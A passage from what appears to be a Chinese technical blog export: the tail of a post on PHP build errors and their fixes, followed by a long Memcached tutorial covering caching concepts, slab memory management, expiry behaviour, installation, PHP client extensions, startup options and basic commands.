-lxml2 -lz -lm -lfreetype -lmysqlclient -lm -lr t -ldl -lxml2 -lz -lm -lxml2 -lz -lm -lcrypt -lxml2 -lz -lm -lxml2 -lz -lm -lxml2 -lz -lm -lxml2 -lz -lm -lxslt -lxml 2 -lz -lm -lssl -lcrypto -lcrypt 「-liconv」 解决方法2：自己打包替换系统内的iconv包\nmake: *** [ext/phar/phar.php] Error 127 /root/dev/php-5.3.6/sapi/cli/php: error while loading shared libraries: libmysqlclient.so.18: cannot open shared object file: No such file or directory make: *** [ext/phar/phar.php] Error 127 解决：网上找到的解决办法是\nln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/lib/ 照做后仍然报错，原因是该方法适用于32位系统，64位系统应使用下面的这行\nln -s /usr/local/mysql/lib/libmysqlclient.so.18 /usr/lib64/ 另外：在编译的时候，不写mysql的路径，而使用mysqlnd代替，也可解决该问题的出现。\n参考：\necho \u0026quot;/app/mysql/lib/libmysqlclient.so.18\u0026quot; \u0026gt;\u0026gt;/etc/ld.so.conf ldconfig configure: error: Don\u0026rsquo;t know how to define struct flock on this system, set \u0026ndash;enable-opcache=no 原因:目前不明\nchecking for sysvipc shared memory support... no checking for mmap() using MAP_ANON shared memory support... no checking for mmap() using /dev/zero shared memory support... no checking for mmap() using shm_open() shared memory support... no checking for mmap() using regular file shared memory support... no checking \u0026quot;whether flock struct is linux ordered\u0026quot;... \u0026quot;no\u0026quot; checking \u0026quot;whether flock struct is BSD ordered\u0026quot;... \u0026quot;no\u0026quot; configure: error: Don't know how to define struct flock on this system, set --enable-opcache=no 解决方法：执行如下后，重新编译即可\nexport LD_LIBRARY_PATH=/app/mysql/lib 参考资料：http://www.jianshu.com/p/0d6d188c2ddc\nphp5.5 mysql5.6 Don't know how to define struct flock on this system, set --enable-opcache=no 解决方法：\nln -s /app/mysql/lib/libmysqlclient.so /usr/lib ln -s /app/mysql/lib/libmysqlclient.so.18.1.0 /usr/lib vim /etc/ld.so.conf /usr/lib ldconfig -v 在虚拟机中编译PHP问题 错误 make: *** [ext/fileinfo/libmagic/apprentice.lo] Error 1\n原因：这是由于内存小于1G所导致。\n解决办法：在./configure加上选项。\n--disable-fileinfo Disable # \u0026lt;==fileinfo support 禁用 fileinfo configure: error: Cannot find libmysqlclient under /app/mysql. 经查，问题是64位系统中 libmysqlclient 默认安装到了 /usr/lib64/mysql/ 目录下，而 /usr/lib 目录下没有相应文件，但是php编译时，要去 /usr/lib目录下查找\n解决：ln -s /app/mysql/lib /app/mysql/lib64\nmake install错误 /home/tools/php-5.3.27/sapi/cli/php: error while loading shared libraries: libmysqlclient.so.18: cannot open shared object file: No such file or directory make[1]: *** [install-pear-installer] 错误 127 make: *** [install-pear] 错误 2 原因：mysql5.5的的lib路径跟之前的不一样 解决：\necho \u0026quot;/app/mysql/lib\u0026quot; \u0026gt;\u0026gt; /etc/ld.so.conf ldconfig make install正确安装 PHP5.3\n/home/tools/php-5.3.27/build/shtool install -c ext/phar/phar.phar /app/php-5.3.27/bin ln -s -f /app/php-5.3.27/bin/phar.phar /app/php-5.3.27/bin/phar Installing PDO headers: /app/php-5.3.27/include/php/ext/pdo/ PHP5.5\nThank you for using PHP. config.status: creating php5.spec config.status: creating main/build-defs.h config.status: creating scripts/phpize config.status: creating scripts/man1/phpize.1 config.status: creating scripts/php-config config.status: creating scripts/man1/php-config.1 config.status: creating sapi/cli/php.1 config.status: creating sapi/fpm/php-fpm.conf config.status: creating sapi/fpm/init.d.php-fpm config.status: creating sapi/fpm/php-fpm.service config.status: creating sapi/fpm/php-fpm.8 config.status: creating sapi/fpm/status.html config.status: creating sapi/cgi/php-cgi.1 config.status: creating ext/phar/phar.1 config.status: creating ext/phar/phar.phar.1 config.status: creating main/php_config.h config.status: executing default commands ","permalink":"https://www.oomkill.com/2016/10/install-troubleshooting/","summary":"","title":"PHP安装错误记录"},{"content":"1 Memcached介绍及常见同类软件对比 1.1 Memcached是什么？ Memcached是一个开源的、支持高性能、高并发的分布式缓存系统，由C语言编写，总共2000多行代码。从软件名称上看，前3个字符的单词Mem就是内存的意思，接下来的后面5个字符的单词Cache就是缓存的意思，最后一个字符d是daemon的意思，代表是服务端守护进程模式服务。\nMemcached服务分为服务端和客户端两部分，其中，服务端软件的名字形如 Memcached-1.4.24.tat.gz，客户端软件的名字形如 Memcache-2.25.tar.gz\nMemcached软件诞生于2003年，最初由LiveJournal的BradFitzpatrick开发完成。Memcached是整个项目的名称，而Memcached是服务器端的主程序名，因其协议简单，使用部署方便、且支持高并发而被互联网企业广泛使用，知道现在仍然被广泛应用。官方网址：http://memcached.org\n1.2 Memcached的作用 传统场景，多数Web应用都将数据保存到关系型数据库中（例如MySQL），Web服务器从中读取数据并在浏览器中显示。但随着数据量的增大、访问的集中，关系型数据库的负担就会加重、响应缓慢、导致网站打开延迟等问题，影响用户体验。\n这时就需要Memcached软件出马了。使用Memcached的主要目的是，通过在自身内存中缓存关系型数据库的查询结果，减少数据库自身被访问的次数，以提高动态web应用的速度、提高网站架构的并发能力和可扩展性。\nMemcached服务的运行原理是通过在实现规划好的系统内存空间中临时缓存数据库的各类数据，以达到减少前端业务服务对数据库的直接高并发访问，从而达到提升大规模网站急群众动态服务的并发访问能力。\n生产场景的Memcached服务一般被用来保存网站中经常被读取的对象或数据，就像我们的客户端浏览器也会把经常访问的网页缓存起来一样，通过内存缓存来存取对象或数据要比磁盘存取快很多，因为磁盘是机械的，因此，在当今的IT企业中，Memcached的应用范围很广泛\n1.3 互联网常见内存服务软件 下表为互联网企业场景常见内存缓存服务软件相关对比信息：\n软件 类型 主要作用 缓存的数据 Memcached 纯内存型 常用于缓存网站后端的各类数据，例如数据库中的数据 主要缓存用户重复请求的动态内容，blog的博文BBS的帖子等内容用户的Session会话信息 Redis/Mongodb/memcachedb 可持久化存储，即使用内存也会使用磁盘存储 1. 缓存后端数据库的查询数据\n2.作为关系数据库的重要补充 1.作为缓存：主要缓存用户重复请求的动态内容：例如BLOG的博文、BBS的帖子等内容。2.作为数据库的有效补充：例如：好友关注、粉丝统计、业务统计等功能可以用持久化存储。 Squid/Nginx 内存或内存加磁盘缓存 主要用于缓存web前端的服务内容 主要用于静态数据缓存，例如：图片，附件（压缩包），js,css,html等，此部分功能大多数企业会选择专业的CDN公司如：蓝讯、网宿。 2 Memcached常见用途工作流程 Memcached是一种内存缓存软件，在工作中经常用来缓存数据库的查询数据，数据被缓存在事先预分配的Memcached管理的内存中，可以通过API或命令的方式存取内存中缓存的这些数据，Memcached服务内存中缓存的数据就像一张巨大的HASH表，每条数据都是以key-value对的形式存在。\n2.1 网站读取Memcached数据时的工作流程 Memcached用来缓存查询到的数据库中的数据，逻辑上，当程序访问后端数据库获取数据时会先优先访问Memcached缓存，如果缓存中有数据就直接返回给客户端用户，如果没有数据（没有命中）程序再去读取后端的数据库的数据，读取到需要的数据后，把数据返回给客户端，同时还会把读取到的数据库缓存到Memcached内存中，这样客户端用户再请求相同数据就会直接读取Memcached缓存的数据，这样就大大减轻了后端数据库的压力，并提高了整个网站的响应速断，提升了用户体验。\n图2-1展示了Memcached缓存系统和后端数据库系统的协作流程\r上图，使用Memcached缓存查询数据来减少数据库压力的具体工作流程如下：\nweb程序首先检查客户端请求的数据是否在Memcached缓存中存在，如果存在，直接把请求的数据返回给客户端，此时不在请求后端数据库。\n如果请求的数据在Memcached缓存中不存在，则程序会请求数据库服务，把数据库中取到的数据返回给客户端，此时不再请求后端数据库。\n2.2 网站更新Memcached数据时工作流程 当程序更新或者删除数据时，会首先处理后端数据库中的数据。 程序处理后端数据库中的数据的同时，也会通知Memcached中的对应旧数据失效，从而保证Memcached中缓存的数据始终和数据库中的户数一直，这个数据一致性非常重要，也是大型网站分布式缓存集群的最头痛的问题所在。 如果是在高并发读写场合，除了要程序通知Memcached过期的缓存失效外，还可能会通过相关机制，例如在数据库上部署相关程序（例如：在数据库中设置触发器使用UDFs），实现当数据库有更新就会把数据更新到Memcached服务中，使得客户端在访问新数据前，预先把更新过的数据库数据复制到Memcached中缓存起来，这样可以减少第一次查询数据库带来的访问压力，提升Memcached中缓存的命中率，甚至sina门户还会把持久化存储redis做成MySQL数据库的从库，实现真正的主从复制。 Memcached网站作为缓存应用更新数据流程图见下图1-2\rMemcached服务作为缓存应用通过相关软件更新数据见图2-2\r3 Memcached在企业中的应用场景 3.1 作为数据库查询数据缓存 3.1.1 完整数据缓存 例如电商的商品分类功能不会经常变动，就可以实现放到Memcached里，然后再对外提供数据访问。这个过程被称之为“数据预热”。\n此时秩序读取缓存无需读取数据库就能读到Memcached缓存里的所有商品分类数据了，所以数据库的访问压力就会大大降低了。\n为什么商品分类数据可以实现放在缓存里呢？\n因为，商品分类几乎都是由内部人员管理的，如果需要更新数据，更新数据库后，就可以把数据同时更新到Memcached里。\n如果把商品分类数据做成静态化文件，然后通过在前段WEB缓存或者使用CDN加速效果更好。\n3.1.2 热点数据缓存 热点数据缓存一般是用于由用户更新的商品，例如淘宝的卖家，当卖家新增商品后，网站程序就会把商品写入后端数据库，同时把这部分数据，放入Memcached内存中，下一次访问这个商品的请求就直接从Memcached内存中取走了。这种方法用来缓存网站热点的数据，即利用Memcached缓存经常被访问的数据。\n特别提示：这个过程可以通过程序实现，也可以在数据库上安装软件进行设置，直接由数据库把内容更新到Memcached中，相当于Memcached是MySQL的丛库一样。\n淘宝、京东、小米等电商双11秒杀抢购场景：\n如果碰到电商双11秒杀高并发的业务场景，必须要实现预热各种缓存，包括前端的web缓存和后端的数据缓存。\n先把数据放入内存预热，然后在逐步动态更新。先读取缓存，如果缓存里没有对应的数据，再去读取数据库，然后把读到的数据放入缓存。如果数据库里的数据更细，需要同时触发缓存更细，防止给用户过期的数据，当然对于百万级别并发还有很多其它的工作要做。\n⚠ 提示：这个过程可以通过程序实现，也可以在数据库上安装相关软件进行设置，直接由数据库把内容更新到Memcached中，就相当于Memcached是MySQL的从库一样\n如果碰到双十一、秒杀高并发的业务场景，必须要事先预热各种缓存，包括前段的Web缓存和后端的数据缓存。\n也就是说事先把数据放入内存预热，然后逐步动态更新。此时，会先读取缓存，如果缓存里没有对应的数据，再去读取数据库，然后把读到的数据放入缓存。如果数据库里的数据更新，需要同时触发缓存更新，防止给用户过期的数据，当然对于百万级别并发还有很多其他的工作要做。\n绝大多数的网站动态数据都是保存在数据库当中的，每次频繁地存取数据库，会导致数据库性能急剧下降，无法同时服务更多的用户（比如MySQL特别频繁的表锁就会存在此问题），那么，就可以让Memcached来分担数据库的压力。增加Memcached服务的好处除了可以分担数据库的压力以外，还包括无须改动整个网站架构，只需简单修改下程序逻辑，让程序先读取Memcached缓存查询数据即可。更新数据时也要更新Memcached缓存。\n【分布式应用1】\nMemcached支持分布式，我们在应用服务程序上改造，就可以更好的支持。例如：可以根据key适当进行有规律的封装，比如以用户位置的网站来说，每个用户都有UID。那么可以按照固定的ID来进行提取和存取，比如1开头的用户保存在第一台Memcached服务器上，以2开头的用户的数据保存在第二天Memcached服务器上，存取数据都先按照UID来进行的转换和存取。\n【分布式应用2】\n在应用服务器上通过程序及URL_HASH，抑制性哈希算法区访问Memcache服务，所有Memcached服务器的地址池可以简单的配在程序的配置文件里。\n【分布式应用3】\n门户网站如百度，会通过一个中间件代理负责请求后端的Cache服务。\n【分布式应用4】\n可以用常见的LVS haproxy做Cache的负载均衡，和普通应用服务相比，这里的重点是轮训算法，一般会选择url_hash，及consistent hash算法。\n算法重要性图解\n3.2 作为集群节点的session会话存储 即把客户端用户请求多个前端应用服务集群产生的session会话信息，统一存储到一个Memcached缓存中。由于session会话数据是存储在内存中的，所以速度很快。\n图3-2为Memcached服务在企业集群架构中常见的工作位置。\n3.3 Memcached服务在企业集群架构中的位置 下图为Memcached服务在企业集群架构中常见的工作位置。\n3.4 缓存雪崩效应 一般是由于某个节点生效，导致其他节点的缓存命中率下降，缓存中缺失的数据去数据可查询。短时间内造成数据库服务器崩溃。或，由于缓存周期性的输小，如：6小时失效一次，那么每6小时，将有一个请求\u0026quot;峰值\u0026quot;，严重情况下会导致数据库宕机。\n4 Memcached的特点与工作机制 4.1 Memcache的特征 Memcached作为高并发、高性能的缓存服务，具有如下特征：\n4.1.1 协议简单 Memcached的协议实现简单，采用基于文本行的协议，能通过telnet/nc等命令直接操作Memcached服务读取数据。\n4.1.2 支持epoll/kqueue异步I/O模型，使用libevent作为事件处理通知机制。 简单的说libevent是一套利用C开发的程序库，他将BSD系统的kqueue，Linux系统的epoll等事件处理功能封装成一个接口，确保即使服务器端的连接数量增加也能发挥很好的性能。Memcached就是利用这个libevent库进行异步事件处理。\n4.1.3 key/value键值数据类型 被缓存的数据以key/value键形式存在的，例如：\nzhangsan=\u0026gt;23 key=zhangsan value=23\r通过zhangsan key可以获取到23\r4.1.4 全内存缓存，效率高 Memcached管理内存的方式非常搞笑，即全部的数据都存放于Memcached服务实现分配好的内存中，无持久化存储的设计，和系统的物理内存一样，当重启系统或Memcached服务时，Memcached内存中的数据即会丢失。\n如果希望重启后，数据依然能保存，那么就可以采用redis这样的持久性内存缓存系统的缓存数据。也可以在存放数据时，对存储的数据设置过期时间，这样过期后数据就自动被清除，Memcached服务本身不会监控数据过期，而是在访问的时候查看key的时间戳判断是否过期。\n4.1.5 可支持分布式集群 Memcached没有像MySQL那样的主从复制方式，分布式Memcached集群的不同服务器之间是互不通讯的，每一个节点都独立存取数据，并且数据内容也不一样。通过对Web应用端的程序设计或者通过支持hash算法的负载均衡软件，可以让Memcached支持大规模海量分布式缓存集群应用。\n4.2 Memcached工作原理与机制 4.2.1 Memcached工作原理 Memcached是一套类似C/S模式的架构软件，在服务器端启动Memcached服务守护进程，可以指定监听本地的IP地址、端口号、并发访问连接数，以及分配了多少内存来处理客户端请求。\n4.2.2 Socket时间处理机制 Memcached软件是由C语言来实现的，全部代码仅有2000多行，采用的是异步epoll/kqueue非阻塞I/O网络模型，其实现方式是基于异步的libevent时间单进程、单线程模式。使用libevent作为事件通知机制，应用程序端通过指定服务器的IP地址及端口，就可以连接Memcached服务进程通讯。\n4.2.3 数据存储机制 需要被缓存的数据以key/value键值对的形式保存在服务器端预分配的内存区中，每个被缓存的数据都有唯一的标识key，操作Memcached中的数据就是通过这个唯一标识的key进行的。缓存到Memcached中的数据仅放置在Memcached服务预分配的内存中，而非存储在Memcached服务器所在的磁盘上，因此存取速度非常快。\n由于Memcached服务自身没有对缓存的数据进行持久化存储的设计，因此，在服务端的Memcached服务进程重启之后，存储在内存中的这些数据都会丢失。且当内存中缓存的数据容量达到启动时设定的内存值时，也会自动使用LRU算法删除过期的数据。\n开发Memcached的初衷仅是通过内存缓存提示访问效率，并没有过多考虑数据的永久存储问题。因此，如果使用Memcached作为缓存数据服务，要考虑数据丢失后带来的问题，例如：是否可以重新生成数据，还有，在高并发场合下缓存宕机或重启会不会导致大量请求直接到数据库，导致数据库无法承受，最终导致网站架构雪崩等。\n4.2.4 内存管理机制 Memcached采用了如下机制： 采用slab内存分配机制。 采用LRU对象清除机制。 采用hash机制快速检索item。 4.2.5 多线程处理机制 多线程处理时采用的是pthread（POSIX）线程模式。 若要激活多线程，可在编译时指定：./configure --enable-threads 。 锁机制不够完善。 负载过重时，可以开启多线程（-t线程数为CPU核数）。 4.3 Memcached预热理念及集群节点的正确重启方法 4.3.1 Memcached预热理念 当需要大面积重启Memcached时，首先要在前端控制网站入口的访问流量，然后重启Memcached集群并进行数据预热，所有数据都预热完毕之后，在逐步开放前端网站入口的流量。\n为了满足Memcached服务可以持久化存储的需求，在较早时期，新浪网基于Memcached服务开发了一款NoSQL软件，名字为MemcacheDB，实现了在缓存的基础上增加了之久存储的特性，不过目前逐步被更优秀的redis mongodb取代了。\n4.3.2 如何正确开启网站集群服务器 如果由于机房断电或者搬迁服务器集群到新机房，那么启动集群服务器时，一定要从网站集群的后端**==依次往前端开启==**，特别是开启Memcached缓存服务器时要提前预热。\n5 Memcached内存管理 5.1 Memcached内存管理机制深入剖析 5.1.1 Malloc内存管理机制 在讲解Memcached内存管理机制前，先来了解malloc。\nmalloc的全称是memory allocation，中文名称动态内存分配，当无法知道内存具体位置的时候，想要绑定真正的内存空间，就需要用到动态分配内存。\n早期的Memcached内存管理是通过malloc分配的内存实现的，使用完后通过free来回收内存。这种方式容易产生内存碎片并降低操作系统对内存的管理效率。因此，也会加重操作系统内存管理器的负担，最坏的情况下，会导致操作系统比Memcached进程本身还慢，为了解决上述问题，Slab Allocator内存分配机制就诞生了。\n5.1.2 Slab内存管理机制 现在的Memcached是利用Slab Allocation机制来分配和管理内存的，过程如下。\n提前将大内存分配大小为1MB的若干个slab，然后针对每个slab在进行小对象填充，这个小对象成为chunk，避免大量重复的初始化和清理，减轻了内存管理器的负担。 Slab Allocation内存分配的原理是按照预先规定的大小，将分配给Memcached服务的内存预先分割成特定长度的内存块(chunk)分成组(chunks slab class)，这些内存块不会释放，可以重复利用。 新增数据对象存储时。因Memcached服务器中保存这slab内空闲chunk的列表，他会根据该列表选择chunk，然后将数据缓存于其中。当有数据存入时，Memcached根据接收到的数据大小，选择最适合数据大小的slab分配一个能存下这个数据的最小内存块(chunk)。例如：有100字节的一个数据，就会分配存入下面112字节的内存块中，会有这样12字节被浪费，这部分空间就不能被使用了，这也是SlabAllocator机制的一个缺点。\nSlab Allocator还可以重复使用已分配的内存，即分配道德内存不书房，而是重复利用。\nSlab Allocation的主要术语\nSlab Allocation主要术语 注解说明 slab class 内存区类别（48bytes-1MB） slab 动态创建的实际内存区，即分配给Slab的内存空间，默认是1MB。分配给Slab之后根据slab的大小切分成chunk。slab默认大小为1048576byte(1MB)，大于1MB的数据会忽略。 slab classid slab class的ID chunk 数据区块，固定大小，chunk初始大小，1.4版本中是48bytes item 实际存储在chunk中的数据项。 Slab内存管理机制特点\n提前分配大量内存Slab 1Mb，再进行小对象填充chunk。 避免大量重复的初始化和清理，减轻内存管理器的负担。 避免频繁malloc/free内存分配导致的碎片。 下面对Mc内存管理机制进行一个小结\nmc的早期内存管理机制为malloc（动态分配内存）。 malloc（动态内存分配）产生内存碎片，导致操作系统性能急剧下降。 Slab内存分配机制可以解决内存碎片的问题 Memcached服务的内存预先分割成特定长度的内存块，成为chunk，用于缓存数据的内存空间或内存块，相当于磁盘的block，只不过磁盘的每一个block都是相等的，而chunk只有在同一个Slab Class内才是相等的。 Slab Class指特定大小（1MB）的包含多个chunk的集合或组，一个Memcached包含多个Slab Class，每个Slab Class包含多个相同大小的chunk。 Slab机制也有缺点，例如，Chunk的空间会有浪费等。 5.2 Memcached Slab Allocator内存管理机制的缺点 chunk存储item浪费空间\nSlab Allocator解决了当初的内存碎片问题，但新的机制也给Memcached带来了新的问题。这个问题就是，由于分配的是特定长度的内存，因此无法有效利用分配的内存。例如：将100字节的数据缓存到128字节的chunk中，剩余的28字节就浪费了\n避免浪费内存的方法是，预先计算出应用存入的数据大小，或把同一业务类型的数据存入一个Memcached服务器中，确保存入的数据大小相对均匀，这样就可以较少内存的浪费。\n还有一种方法是，在启动时，指定-f参数，能在某种程度上控制内存组之间的大小差异。在应用中使用Memcached时，通常可以不重新设置这个参数，即默认值1.25进行部署即可。如果想优化Memcached对内存的使用，可以考虑重新计算数据的预期品均长度，调整这个参数来获得合适的设置值。\n5.3 Memcached的检测过期与删除机制 5.3.1 Memcached懒惰检测对象的过期机制 首先要知道，Memcached不会主动检测item对象是否过期，而是在进行get操作时检查item对象是否过期自己是否应该删除！\n因为不会主动检测item对象是否过期，自然也就不会释放已分配给对象的内存空间了，除非为添加的数据设定过期时间或内存缓存满了，在数据过期后，客户端不能通过key取他的值，起存储空前被重新利用。\nMemcached使用的这种策略为懒惰检测对象过期策略，即自己不监控存入的key/value对是否过期，而是在获取key值时查看记录时间戳(set key flag exptime bytes)，从而检查key/value对空间是否过期。这种策略不会在过期检测上浪费CPU资源\n5.3.2 Memcached惰性删除对象机制 当删除item对象时，一般不会释放内存空间，而是做删除标记，将指针放入slot回收插槽，下次分配的时候直接使用。\nMemcached在分配空间时，会优先使用已经过期的key/value对空间；若分配的内存空间占满，Memcached就会使用LRU算法来分配空间，删除最近最少使用的key/value对，从而将其空间分配给新的key/value对。在某些情况下（完整缓存），如果不想使用LRU算法，那么可以通过“-M”参数来启动Memcached，这样Memcached在内存耗尽时，会返回一本报错信息，如下：\n-M return error on memory exhausted (rather than removing items)\rMemcache删除机制小结：\n不主动检测item对象是否过期，而是在get时才会检查item对象是否过期以及是否应该删除。\n当删除item对象时，一般不释放内存空间，而是做删除标记，将指针放入slot回收插槽，下次分配的时候直接使用。\n当内存空间满的时候，将会根据LRU算法把最近最少使用的item对象删除。\n数据存入可以设定过期时间，但是数据过期后不会被立即删除，而是在get时检查item对象是否过期以及是否应该删除。\n如果不希望系统使用LRU算法清楚数据，可以使用-M参数。\nstats STAT curr_items 3\rSTAT total_items 10\t#←删除前的item对象\rSTAT evictions 0\rEND\rflush_all\rOK\rstats\rSTAT pid 1532\r...\rSTAT curr_items 3\t#←由于memcached删除机制的原理，数据并未释放而是做了标记\rSTAT total_items 10\t#←在下次访问过\rSTAT evictions 0\rEND\rflush_all OK\rSTAT curr_items 2\rSTAT total_items 6\rSTAT evictions 0\rEND\rget a\rEND\rstats\r...\rSTAT bytes 67\rSTAT curr_items 1\rSTAT total_items 6\rSTAT evictions 0\rEND\r# 数据过期与上述基本相同\rset key 0 10 2\r23\rSTORED\rstats\r..\rSTAT curr_items 1\rSTAT total_items 2\rSTAT evictions 0\rEND\rget ket END\rstats\r...\rSTAT curr_items 1\rSTAT total_items 2\rSTAT evictions 0\rEND\rget key\rEND\rstats\r...\rSTAT curr_items 0\rSTAT total_items 2\rSTAT evictions 0\rEND\rmemcached-slab内存管理\n6 Memcache服务安装 6.1 Memcached 安装 Memcached的安装比较简单，支持Memcached的平台常见的有Linux、FreeBSD、Solaris、windows。这里以CentOS 7为例进行讲解。\n6.1.1 安装libevent及连接Memcached工具nc 系统安装环境如下\n$ cat /etc/redhat-release CentOS Linux release 7.1.1503 (Core) $ uname -r\r3.10.0-229.el7.x86_64\r$ uname -m\rx86_64\r安装Memcached前，需要先安装libevent，此处用yum安装libevent。\nyum install libevent libevent-devel nc -y\r# centos7 nc变更为nmap-ncat\r6.1.2 编译安装Memcached ./configure --prefix=/app/memcached\rmake \u0026amp;\u0026amp; make install\ryum安装的Memcached版本略低，但是不影响使用。\n# CentOS 6\r$ yum list nc memcached\rLoaded plugins: fastestmirror, security\rLoading mirror speeds from cached hostfile\rAvailable Packages\rmemcached.x86_64 1.4.4-3.el6_8.1 updates\rnc.x86_64 1.84-24.el6 base # CentOS 7\r$ yum list memcached|grep memcached\rmemcached.x86_64 1.4.15-10.el7_3.1 updates\r6.2 安装Memcached客户端 LAMP PHP环境准备\n这里以PHP虚拟机程序为例，首先要在LAMP环境下能出来phpinfo信息页面，只有这样才能继续操作。具体如图：\n6.2.1 PHP扩展插件Memcache与Memcached PHP的Memcached扩展分为两个版本：\nmemcache 是 pecl 扩展库版本，原生支持php，出现于2004年。\nmemcached 是 libmemcached 版本，出现较后，是新一代，因此也更加完善，推荐使用。\n在安装memcache扩展的时候并不要求安装其他依赖，但是在安装memcached的时候会要求你安装libmemcached，问题来了，libmemcached是memcache的C客户端，它具有的优点是低内存，线程安全等特点。比如新浪微博之前就全面将php的memcache替换成php的memcached，在高并发下，稳定性果断提高。差别比较大的一点是，memcached 支持 Binary Protocol，而 memcache 不支持，意味着 memcached 会有更高的性能。不过，还需要注意的是，memcached 目前还不支持长连接。\n参考网址：http://blog.wpjam.com/m/memcache-vs-memcached/\n6.2.2 PHP Memcache扩展安装 php的Memcache的扩展插件下载地址为：http://pecl.php.net/package/memcache\nPHP的Memcache客户端扩展插件安装命令如下：\n/app/php/bin/phpize\r./configure --enable-memcache --with-php-config=/app/php/bin/php-config\rmake \u0026amp;\u0026amp; make install\r配置Memcache客户端，使其生效\n修改PHP的配置文件php.ini，加入Memcache客户端的配置\nextension=/app/php-5.5/lib/php/extensions/no-debug-non-zts-20121212/memcache.so\r重启php fpm服务使php的配置修改生效\n/app/php/sbin/php-fpm -t\r打开浏览器访问phpinfo页面，出现下图表示Memcache客户端安装成功。\n6.2.2 部署memcached PHP Memcached 扩展基于 libmemcached 开发的，使用 libmemcached 库提供的 API 与 Memcached 服务进行交互。顾安装php memcached扩展需要先安装libmemcached\nlibmemcached下载地址:https://launchpad.net/libmemcached\n安装libmemcached依赖包\nyum install cyrus-sasl-devel -y\r遇到如下错误：\nconfigure: error: no, sasl.h is not available. Run configure with --disable-memcached-sasl to disable this check\r解决：需先安装后在编译libmemcached\nyum install cyrus-sasl-devel -y\r编译libmemcached：\n./configure \\\r--with-memcached=/usr/local/memcached \\\r--prefix=/usr/local/libmemcached\r安装PHP Memcached组件\n下载和解压这步，我们要区分是PHP7还是之前的版本：\n下载网址：http://pecl.php.net/package，这里写名3.0版本之后，支持PHP版本为7.0或以上\n编译参数\n/app/php/bin/phpize\r./configure \\\r--enable-memcached \\\r--with-php-config=/app/php-5.5/bin/php-config \\\r--with-libmemcached-dir=/app/libmem-1.0.18/\r配置Memcache客户端，使其生效\n修改PHP的配置文件php.ini，加入Memcache客户端的配置\nextension=/app/php-5.5/lib/php/extensions/no-debug-non-zts-20121212/memcached.so\r打开浏览器访问phpinfo页面，出现下图表示Memcached组件安装成功。\n测试Memcache扩展与Memcached扩展\n测试Memcache扩展是否成功 $m = new Memcache();\r$m-\u0026gt;connect('127.0.0.1',11211) or die('Could not connect');\r$m-\u0026gt;set('key2321','zhangsan');\recho $m-\u0026gt;get('key2321');\r测试Memcached扩展是否成功 $m = new Memcached();\r$m-\u0026gt;addServer('127.0.0.1',11211,40);\r$m-\u0026gt;set('ke1','zhangsan2');\recho $m-\u0026gt;get('ke1');\r用telnet查询\n$ telnet 127.0.0.1 11211\rTrying 127.0.0.1...\rConnected to 127.0.0.1.\rEscape character is '^]'.\rget key2321\rVALUE key2321 0 8\rzhangsan\rEND\rget ke1\rVALUE ke1 0 9\rzhangsan2\rEND\r参考网址：http://www.bcty365.com/content-103-3516-1.html\n7 Memcached服务的基本管理 7.1 启动Memcached 启动Memcached的命令如下：\n$ /home/memcached/bin/memcached -m 16m -p 11211 -d -u root -c 8192\r查看启动状态\n$ lsof -i:11211\rCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\rmemcached 16729 root 26u IPv4 139948 0t0 TCP *:memcache (LISTEN)\rmemcached 16729 root 27u IPv6 139949 0t0 TCP *:memcache (LISTEN)\rmemcached 16729 root 28u IPv4 139952 0t0 UDP *:memcache memcached 16729 root 29u IPv4 139952 0t0 UDP *:memcache memcached 16729 root 30u IPv4 139952 0t0 UDP *:memcache memcached 16729 root 31u IPv4 139952 0t0 UDP *:memcache memcached 16729 root 32u IPv6 139953 0t0 UDP *:memcache memcached 16729 root 33u IPv6 139953 0t0 UDP *:memcache memcached 16729 root 34u IPv6 139953 0t0 UDP *:memcache memcached 16729 root 35u IPv6 139953 0t0 UDP *:memcache 配置ld.so.conf路径防止启动Memcached时报错\necho '/usr/local/lib' \u0026gt;\u0026gt;/etc/ld.so.conf\rldconfig\r启动多个实例\nmemcached -m 16m -p 11212 -d -uroot -c 8192\r查看结构\n$ netstat -lntup\rActive Internet connections (only servers)\rProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:11211 0.0.0.0:* LISTEN 16729/memcached tcp 0 0 0.0.0.0:11212 0.0.0.0:* LISTEN 16741/memcached tcp6 0 0 :::11211 :::* LISTEN 16729/memcached tcp6 0 0 :::11212 :::* LISTEN 16741/memcached udp 0 0 0.0.0.0:11211 0.0.0.0:* 16729/memcached udp 0 0 0.0.0.0:11212 0.0.0.0:* 16741/memcached udp6 0 0 :::11211 :::* 16729/memcached udp6 0 0 :::11212 :::* 16741/memcached 7.2 Memcached启动相关参数说明 表7-1为Memcached启动命令相关参数说明\n命令参数 说明 进程与连接参数 -d 以守护进程（daemon）方式运行服务 -u 指定运行Memcached的用户，如果当前用户为root，需要使用此参数指定用户 -l 指定Memcached进程监听的服务器IP地址，可以不设置此参数。 -p 指定Memcached服务监听TCP端口号。默认为11211 -P 设置Memcached的PID文件（$$），保存PID到指定文件 内存相关设置 -m 指定Memcached服务可以缓存数据的最大内存，默认为64M -M Memcached服务内存不够时禁止LRU，如果内存满了会报错 -n 为key+value+flags分配的最小内存空间，默认为48节 -f chunk size增长因子，默认为1.25 -L 启用大内存页，可以降低内存浪费，改进性能。 并发连接设置 -c 最大的并发连接数，默认是1024 -t 线程数，默认4,。由于Memcached采用的是NIO，所以太多线程作用不大 -R 每个event的最大请求，默认是20 -C 禁用CAS（可以禁止版本计数，减少开销） 调试参数 -v 打印较少的errors/warings -vv 打印非常多调试信息和错误输出到控制台，也打印客户端命令及相应 -vvv 打印极多的调试信息和错误输出，也打印内部状态转变 更多参数 memcached -h\n7.3 向Memcached中写入数据。并检查 7.3.1 Memcached中的数据形式及与MySQL相关语句对比 向Memcached中添加数据时，注意添加的数据一般为键值对的形式，例如：key1-value1 key2-value2\n这里把Memcached添加、查询、删除等的命令和MySQL数据库做了一个基本类比。见表7-2\nMySQL数据库管理 Memcached管理 MySQL的insert语句 Memcached的set命令 MySQL的select语句 Memcached的get命令 MySQL的delete语句 Memcached的delete命令 管理MySQL和Memcached的常见命令类比\n7.3.2 向Memcached中写入数据实践 通过printf配合nc想Memcached中写入数据\n$ printf \u0026quot;set key1 0 0 6\\r\\nzhang\\r\\n\u0026quot;|nc 127.0.0.1 11211 $ 如果set命令的字节是6就要6个字符（字节）。否则插入数据就不会成功\n$ printf \u0026quot;set key1 0 0 6\\r\\nzhangs\\r\\n\u0026quot;|nc 127.0.0.1 